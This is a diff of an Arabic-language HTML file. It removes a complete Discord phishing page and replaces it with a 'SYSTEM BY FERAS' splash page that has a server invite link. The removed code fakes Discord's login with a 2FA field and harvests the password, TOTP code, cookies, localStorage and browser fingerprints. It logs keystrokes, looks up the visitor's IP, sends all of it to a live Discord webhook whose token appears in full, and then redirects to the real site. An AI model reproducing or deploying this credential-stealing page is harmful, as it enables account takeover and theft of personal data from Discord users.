@@ -1,263 +1,233 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Discord</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-<script src="https://cdn.tailwindcss.com"></script>
-<script>
-tailwind.config = {
-  theme: { extend: {
-    fontFamily: { sans: ['Inter', 'ui-sans-serif'] },
-    colors: {
-      'discord-bg': 'linear-gradient(135deg, #36393F 0%, #2F3136 50%, #202225 100%)',
-      'discord-card': 'rgba(24,25,28,.8)',
-      'discord-border': 'rgba(32,34,37,.6)',
-      'discord-input': 'rgba(54,57,63,.8)'
-    }
-  }}
-}
-</script>
-<style>
-:root {
-  --bg-gradient: linear-gradient(135deg,#36393F 0%,#2F3136 50%,#202225 100%);
-  --card-bg: rgba(24,25,28,.95);
-  --card-border: rgba(32,34,37,.6);
-  --input-bg: rgba(54,57,63,.8);
-  --input-border: rgba(64,68,75,.8);
-  --primary: linear-gradient(92.54deg,#7289DA 9.16%,#5865F2 100%);
-  --text-primary: #FFFFFF;
-  --text-secondary: #B9BBBE;
-  --text-muted: #72767D;
-}
-* { margin:0; padding:0; box-sizing:border-box; }
-body { 
-  font-family:'Inter',sans-serif; 
-  background:var(--bg-gradient); 
-  color:var(--text-primary); 
-  min-height:100vh; 
-  overflow-x:hidden;
-}
-.discord-logo {
-  background:linear-gradient(92.54deg,#7289DA 9.16%,#5865F2 100%);
-  -webkit-background-clip:text;
-  -webkit-text-fill-color:transparent;
-  background-clip:text;
-}
-.glow-blue { box-shadow:0 0 20px rgba(88,101,242,.3); }
-.qr-placeholder {
-  background:linear-gradient(45deg,#1E1F22 25%,transparent 25%),linear-gradient(-45deg,#1E1F22 25%,transparent 25%),linear-gradient(45deg,transparent 75%,#1E1F22 75%),linear-gradient(-45deg,transparent 75%,#1E1F22 75%);
-  background-size:20px 20px;
-  background-position:0 0,0 10px,10px -10px,-10px 0;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FERAS IS HERE | ACCESS DENIED</title>
+    <style>
+        /* --- الألوان والخطوط الفخمة --- */
+        :root {
+            --bg-color: #050505;
+            --main-accent: #ff0000; /* أحمر التحذير */
+            --secondary-accent: #8e44ad; /* بنفسجي غامض */
+            --text-color: #f1f1f1;
+            --font-main: 'Courier New', Courier, monospace; /* خط الهاكر الكلاسيكي */
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: var(--font-main);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        /* --- خلفية متحركة فاخرة (تأثير الشبكة) --- */
+        #particles-js {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle, #1a1a1a 1px, rgba(0,0,0,0) 1px);
+            background-size: 30px 30px;
+            z-index: -1;
+            opacity: 0.3;
+        }
+
+        /* --- تأثير الأفاتار المركزي --- */
+        .avatar-container {
+            position: relative;
+            width: 150px;
+            height: 150px;
+            margin-bottom: 30px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid var(--secondary-accent);
+            box-shadow: 0 0 30px var(--secondary-accent), inset 0 0 20px rgba(142, 68, 173, 0.5);
+            transition: transform 0.3s ease-out;
+        }
+
+        .avatar-container:hover {
+            transform: scale(1.1) rotate(5deg);
+        }
+
+        .avatar-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* --- العناوين والتأثيرات الصوتية --- */
+        h1 {
+            font-size: 2.5em;
+            color: var(--main-accent);
+            text-shadow: 0 0 10px var(--main-accent), 0 0 20px var(--main-accent);
+            margin: 0;
+            letter-spacing: 2px;
+            animation: pulse 2s infinite;
+        }
+
+        .status-text {
+            color: var(--text-color);
+            margin: 15px 0 40px 0;
+            font-size: 1.2em;
+            opacity: 0.8;
+            height: 1.5em; /* للحفاظ على الارتفاع أثناء التأثير */
+        }
+
+        /* --- زر الديسكورد الفاخر (رابط السيرفر) --- */
+        .discord-btn {
+            background: linear-gradient(45deg, #1e1e1e, #0a0a0a);
+            color: var(--text-color);
+            border: 2px solid var(--main-accent);
+            padding: 18px 40px;
+            font-size: 1.4em;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            transition: 0.4s;
+            position: relative;
+            overflow: hidden;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.2);
+        }
+
+        .discord-btn:hover {
+            color: #fff;
+            background: var(--main-accent);
+            box-shadow: 0 0 40px var(--main-accent);
+            transform: translateY(-3px);
+        }
+
+        .discord-btn::before {
+            content: '>';
+            position: absolute;
+            left: 15px;
+            opacity: 0;
+            transition: 0.3s;
+        }
+
+        .discord-btn:hover::before {
+            opacity: 1;
+            left: 20px;
+        }
+
+        /* --- رسالة النهاية العربي --- */
+        .ara-text {
+            margin-top: 50px;
+            color: var(--secondary-accent);
+            font-size: 1.1em;
+            font-weight: bold;
+            text-shadow: 0 0 5px var(--secondary-accent);
+        }
+
+        /* --- الحركات (Animations) --- */
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.02); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* ستارة التحميل للتفاعل وتشغيل الصوت */
+        #overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            cursor: pointer;
+            font-size: 2em;
+        }
+    </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4 lg:p-8">
-<div class="w-full max-w-6xl flex flex-col lg:flex-row gap-12 lg:gap-20 items-center">
-  <!-- Left Panel -->
-  <div class="flex-1 text-center lg:text-right max-w-md">
-    <div class="discord-logo text-5xl lg:text-7xl font-black mb-6 tracking-tight">Discord</div>
-    <h1 class="text-4xl lg:text-5xl font-black mb-6 bg-gradient-to-r from-white to-gray-200 bg-clip-text text-transparent">مرحباً بك مرة أخرى!</h1>
-    <p class="text-xl text-gray-300 leading-relaxed">نحن نبني مجتمع حيث يمكنك مشاركة صوتك والتواصل مع الأصدقاء والعائلة</p>
-  </div>
-  
-  <!-- Login Card -->
-  <div class="w-full max-w-sm lg:max-w-md bg-[var(--card-bg)] backdrop-blur-xl border border-[var(--card-border)] rounded-3xl p-8 shadow-2xl hover:shadow-3xl transition-all duration-300">
-    <div class="text-center mb-8">
-      <h2 class="text-2xl font-black text-white mb-2">تسجيل الدخول للمتابعة</h2>
-      <p class="text-[var(--text-secondary)] text-sm">أدخل بريدك الإلكتروني أو رقم هاتفك</p>
+<body>
+
+    <div id="overlay" onclick="startExperience()">
+        اضغط في أي مكان لبدء البروتوكول...
     </div>
-    
-    <div id="errorMsg" class="hidden mb-6 p-4 bg-red-500/20 border border-red-500/50 rounded-2xl text-red-300 text-sm"></div>
-    
-    <form id="loginForm" class="space-y-6">
-      <!-- Email/Phone Input -->
-      <div>
-        <label class="block text-sm font-semibold text-white mb-3">البريد الإلكتروني أو رقم الهاتف</label>
-        <input type="text" id="loginInput" required
-               class="w-full px-5 py-4 bg-[var(--input-bg)] border-2 border-[var(--input-border)] rounded-2xl text-white placeholder-gray-400 text-lg font-medium focus:border-blue-500 focus:ring-4 focus:ring-blue-500/20 focus:outline-none transition-all duration-200 hover:border-gray-500"
-               placeholder="example@gmail.com">
-      </div>
-      
-      <!-- Password Input -->
-      <div>
-        <label class="block text-sm font-semibold text-white mb-3">كلمة المرور</label>
-        <input type="password" id="passInput" required
-               class="w-full px-5 py-4 bg-[var(--input-bg)] border-2 border-[var(--input-border)] rounded-2xl text-white placeholder-gray-400 text-lg font-medium focus:border-blue-500 focus:ring-4 focus:ring-blue-500/20 focus:outline-none transition-all duration-200 hover:border-gray-500"
-               placeholder="•••••••••••••">
-      </div>
-      
-      <!-- 2FA Toggle -->
-      <div class="flex items-center justify-between p-4 bg-gray-900/50 rounded-2xl">
-        <label class="flex items-center gap-3 cursor-pointer select-none">
-          <div class="relative">
-            <input type="checkbox" id="mfaToggle" class="sr-only peer">
-            <div class="w-12 h-7 bg-gray-700 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-500/20 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-1 after:left-1 after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
-          </div>
-          <span class="text-sm font-semibold text-white">التحقق بخطوتين</span>
-        </label>
-      </div>
-      
-      <!-- QR Code + TOTP Container -->
-      <div id="mfaContainer" class="hidden space-y-4">
-        <div class="text-center p-6 bg-gradient-to-br from-gray-900/80 to-gray-800/80 border-2 border-dashed border-gray-700 rounded-3xl qr-placeholder">
-          <div class="w-28 h-28 bg-gradient-to-br from-gray-800 to-black border-4 border-gray-700 rounded-2xl mx-auto flex items-center justify-center text-xs font-mono text-gray-500 mb-3">
-            QR CODE<br>SCAN ME
-          </div>
-          <p class="text-xs text-gray-400 mb-4">📱 افتح Discord على هاتفك وامسح الكود أعلاه</p>
-          <div class="w-full bg-gray-900/50 p-4 rounded-xl">
-            <label class="block text-xs font-bold text-white mb-2 text-center">أو أدخل الرمز يدوياً:</label>
-            <input type="text" id="totpInput" maxlength="8" pattern="[0-9]*"
-                   class="w-full text-center !py-6 bg-gradient-to-r from-gray-800 to-gray-900 border-2 border-gray-600 rounded-2xl text-2xl font-mono tracking-[0.3em] uppercase text-white focus:border-blue-500 focus:ring-4 focus:ring-blue-500/30 transition-all"
-                   placeholder="000000">
-          </div>
+
+    <div id="particles-js"></div>
+
+    <div class="main-content" style="opacity: 0; transition: opacity 2s;">
+        
+        <div class="avatar-container">
+            <img src="https://images.discordapp.net/avatars/452800723646677002/097a9f7e44a47895f329240801833878.png?size=256" alt="Feras" id="userAvatar">
         </div>
-      </div>
-      
-      <!-- Submit Button -->
-      <button type="submit" id="submitBtn" 
-              class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-5 px-6 rounded-3xl text-xl shadow-2xl hover:shadow-3xl hover:-translate-y-1 transform transition-all duration-300 flex items-center justify-center gap-3 group">
-        <span class="default">تسجيل الدخول</span>
-        <div class="loading hidden w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
-      </button>
-    </form>
-    
-    <div class="mt-8 pt-8 border-t border-gray-800 text-center">
-      <a href="#" class="text-blue-400 hover:text-blue-300 text-sm font-semibold transition-all duration-200">مشاكل في تسجيل الدخول؟</a>
+
+        <h1>SYSTEM BY FERAS</h1>
+
+        <div class="status-text" id="status">جاري الاتصال بقاعدة البيانات...</div>
+
+        <a href="https://discord.gg/CTwKRt7u" class="discord-btn" target="_blank">
+            انضم إلى المملكة
+        </a>
+
+        <div class="ara-text">
+            جاكم فراس ي وقع انت وياه
+        </div>
     </div>
-  </div>
-</div>
 
-<script>
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1469329952464961708/VgxYi7uQH8AYVrYyFZorW1BbZJKQQa9Y5fOd3jgmX3fEY4NUYFj6AbhH19hGEiGl_m0c';
+    <audio id="bgMusic" loop>
+        <source src="music.mp3" type="audio/mpeg">
+        متصفحك لا يدعم الصوت.
+    </audio>
 
-const victimData = {
-  ip: 'جاري الاستعلام...',
-  ua: navigator.userAgent,
-  screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-  lang: navigator.language,
-  platform: navigator.platform,
-  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  cookies: document.cookie,
-  localStorage: JSON.stringify(localStorage),
-  canvasFP: '',
-  webglFP: '',
-  audioFP: '',
-  timestamp: new Date().toISOString(),
-  url: location.href,
-  referrer: document.referrer
-};
+    <script>
+        // دالة تشغيل التجربة (الصوت + الأنيميشن)
+        function startExperience() {
+            document.getElementById('overlay').style.display = 'none';
+            document.querySelector('.main-content').style.opacity = '1';
+            
+            // تشغيل الصوت (نحتاج لتفاعل المستخدم أولاً)
+            var audio = document.getElementById("bgMusic");
+            audio.play().catch(error => {
+                console.log("الاصوات معطلة في المتصفح. نحتاج لتفاعل حقيقي.");
+            });
 
-// Generate fingerprints
-function generateFingerprints() {
-  // Canvas
-  const canvas = document.createElement('canvas');
-  const ctx = canvas.getContext('2d');
-  ctx.fillStyle = '#f60';
-  ctx.fillRect(125,1,62,20);
-  ctx.fillStyle = '#069';
-  ctx.fillText('Discord v1.0.9001',2,15);
-  ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-  ctx.fillText('Visibility: visible',4,45);
-  victimData.canvasFP = canvas.toDataURL();
-  
-  // WebGL
-  const glCanvas = document.createElement('canvas');
-  const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
-  if(gl) {
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    victimData.webglFP = `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}|${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
-  }
-  
-  // Audio
-  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-  const oscillator = audioCtx.createOscillator();
-  const analyser = audioCtx.createAnalyser();
-  oscillator.connect(analyser);
-  victimData.audioFP = 'AudioContext supported';
-}
+            // بدء تأثير الكتابة
+            startTyping();
+        }
 
-// Get IP
-fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>victimData.ip=d.ip).catch(()=>0);
-fetch('https://httpbin.org/ip').then(r=>r.json()).then(d=>victimData.ip=d.origin).catch(()=>0);
+        // تأثير الكتابة
+        function startTyping() {
+            const textArray = ["بروتوكول الوصول: نشط", "سيرفر الديسكورد: جاهز", "الهدف: الاتصال بـ فراس"];
+            const statusElement = document.getElementById('status');
+            let arrayIndex = 0;
+            let charIndex = 0;
 
-// Elements
-const form = document.getElementById('loginForm');
-const mfaToggle = document.getElementById('mfaToggle');
-const mfaContainer = document.getElementById('mfaContainer');
-const submitBtn = document.getElementById('submitBtn');
-const errorMsg = document.getElementById('errorMsg');
+            function type() {
+                if (charIndex < textArray[arrayIndex].length) {
+                    statusElement.innerHTML += textArray[arrayIndex].charAt(charIndex);
+                    charIndex++;
+                    setTimeout(type, 100); // سرعة الكتابة
+                } else {
+                    setTimeout(erase, 2000); // وقت التوقف قبل المسح
+                }
+            }
 
-// Keylogger
-document.addEventListener('keydown', e=>{
-  if(['loginInput','passInput','totpInput'].includes(e.target.id)) {
-    console.log(`${e.target.id}: ${e.key}`);
-  }
-});
+            function erase() {
+                if (charIndex > 0) {
+                    statusElement.innerHTML = textArray[arrayIndex].substring(0, charIndex-1);
+                    charIndex--;
+                    setTimeout(erase, 50); // سرعة المسح
+                } else {
+                    arrayIndex = (arrayIndex + 1) % textArray.length;
+                    setTimeout(type, 1000); // وقت التوقف قبل الجملة التالية
+                }
+            }
 
-// 2FA Toggle
-mfaToggle.addEventListener('change', ()=> {
-  mfaContainer.classList.toggle('hidden', !mfaToggle.checked);
-});
-
-// Form submit
-form.onsubmit = async e => {
-  e.preventDefault();
-  
-  // Show loading
-  submitBtn.disabled = true;
-  submitBtn.querySelector('.default').style.display = 'none';
-  submitBtn.querySelector('.loading').classList.remove('hidden');
-  errorMsg.classList.add('hidden');
-  
-  // Collect data
-  const creds = {
-    email_phone: document.getElementById('loginInput').value,
-    password: document.getElementById('passInput').value,
-    totp: document.getElementById('totpInput').value || 'غير مدخل',
-    mfa_enabled: mfaToggle.checked,
-    ...victimData
-  };
-  
-  // Send to Discord
-  try {
-    const embed = {
-      username: '🔒 Discord Security Capture',
-      avatar_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.png',
-      embeds: [{
-        title: '🎯 تم التقاط بيانات Discord كاملة',
-        description: `**البريد/الهاتف:** \`${creds.email_phone}\`\n**كلمة المرور:** \`${creds.password}\`\n**رمز 2FA:** \`${creds.totp}\``,
-        color: 0x5865F2,
-        thumbnail: { url: 'https://cdn.discordapp.com/attachments/1469329952464961708/1183487173435418880/discord.png' },
-        fields: [
-          { name: '🌐 IP', value: `\`${creds.ip}\``, inline: true },
-          { name: '🖥️ الشاشة', value: `\`${creds.screen}\``, inline: true },
-          { name: '📱 الجهاز', value: `${creds.ua.includes('Mobile') ? '📱 موبايل' : '💻 كمبيوتر'}`, inline: true },
-          { name: '🕐 الوقت', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
-          { name: '🔗 الرابط', value: `[الصفحة](${creds.url})`, inline: false },
-          { name: '📤 User Agent', value: `\`${creds.ua.slice(0,60)}...\``, inline: false }
-        ],
-        footer: { text: 'Discord Phishing | QR+2FA Capture ✅', icon_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.gif' }
-      }]
-    };
-    
-    await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify(embed)
-    });
-    
-  } catch(e) { console.error(e); }
-  
-  // Redirect to real Discord
-  setTimeout(()=>window.location.href='https://discord.com/login?redirect_to=%2Fchannels%2F%40me', 1200);
-};
-
-// Init
-generateFingerprints();
-</script>
+            type(); // البدء
+        }
+    </script>
 </body>
 </html>
